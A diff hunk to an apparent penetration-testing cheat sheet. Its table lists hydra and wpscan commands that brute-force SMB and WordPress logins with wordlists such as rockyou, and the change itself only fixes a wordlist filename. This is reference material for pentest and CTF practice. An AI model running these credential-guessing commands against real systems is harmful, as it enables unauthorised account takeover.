@@ -255,7 +255,7 @@ https://book.hacktricks.xyz/brute-force
 | hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb | Hydra brute force SMB user with rockyou: |
 | hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login |
 | hydra -vV -L unique -p wedontcare $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' | Hydra brute force a username |
-| wpscan --url [http://192.168.1.122](http://192.168.1.122/) -U Elliot -P fsocity.dic.unique | Use wpscan to bruteforce password |
+| wpscan --url [http://192.168.1.122](http://192.168.1.122/) -U Elliot -P fsociety.dic.unique | Use wpscan to bruteforce password |
 
 * MD5 32 hex characters.
 * SHA-1 40 hex characters.
